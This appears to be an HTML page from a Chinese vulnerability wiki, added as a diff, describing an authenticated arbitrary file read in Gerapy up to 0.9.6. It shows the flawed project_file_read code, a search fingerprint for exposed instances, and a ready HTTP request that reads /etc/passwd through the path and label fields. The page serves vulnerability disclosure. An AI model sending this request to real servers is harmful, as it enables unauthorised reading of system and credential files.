@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Gerapy/Gerapy%20read%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Gerapy read 后台任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Gerapy read \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        （CVE-2019-11231）GetSimple CMS 远程命令执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Gerapy%20parse%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Gerapy%20parse%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Gerapy parse 后台远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="gerapy-read">Gerapy read 后台任意文件读取漏洞<a class="headerlink" href="#gerapy-read" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Gerapy gerapy/server/core/views.py 中的 project_file_read 方法存在任意文件读取，攻击者登录后台后发送特定的请求包即可利用漏洞 </p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>Gerapy &lt;= 0.9.6</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>title="Gerapy"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1638069254477-82075ea9-6191-4ebd-8e92-bed0104a0942.png" /></p>
+<p>出现漏洞的文件为 <code>gerapy/server/core/views.py</code></p>
+<p><img alt="img" src="../../../.vuepress/public/img/1638085009077-bf005982-09d5-45c8-9468-36c5e3204b00.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nd">@api_view</span><span class="p">([</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@permission_classes</span><span class="p">([</span><span class="n">IsAuthenticated</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">project_file_read</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    get content of project file</span>
+<span class="sd">    :param request: request object</span>
+<span class="sd">    :return: file content</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">body</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">join</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;label&#39;</span><span class="p">])</span>
+        <span class="c1"># binary file</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</code></pre></div>
+<p>参数 path 和 label 都为用户可控变量，登录后构造请求包</p>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">project</span><span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">read</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">Host</span><span class="p">:</span> 
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">35</span>
+<span class="n">Accept</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">,</span> <span class="o">*/*</span>
+<span class="n">Authorization</span><span class="p">:</span> <span class="n">Token</span> <span class="mi">0</span><span class="n">fb31a60728efd8e6398349bea36fa7629bd8df0</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10_15_7</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">96.0.4664.55</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
+<span class="n">x</span><span class="o">-</span><span class="n">forwarded</span><span class="o">-</span><span class="k">for</span><span class="p">:</span> <span class="mf">127.0.0.1</span>
+<span class="n">x</span><span class="o">-</span><span class="n">originating</span><span class="o">-</span><span class="n">ip</span><span class="p">:</span> <span class="mf">127.0.0.1</span>
+<span class="n">x</span><span class="o">-</span><span class="n">remote</span><span class="o">-</span><span class="n">ip</span><span class="p">:</span> <span class="mf">127.0.0.1</span>
+<span class="n">x</span><span class="o">-</span><span class="n">remote</span><span class="o">-</span><span class="n">addr</span><span class="p">:</span> <span class="mf">127.0.0.1</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+
+<span class="p">{</span><span class="s2">&quot;path&quot;</span><span class="p">:</span><span class="s2">&quot;/etc/&quot;</span><span class="p">,</span>
+<span class="s2">&quot;label&quot;</span><span class="p">:</span><span class="s2">&quot;passwd&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1638085088521-218085b1-d086-400e-830a-596d896a6a14.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="btn btn-xs btn-link">
+        （CVE-2019-11231）GetSimple CMS 远程命令执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Gerapy%20parse%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Gerapy%20parse%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Gerapy parse 后台远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
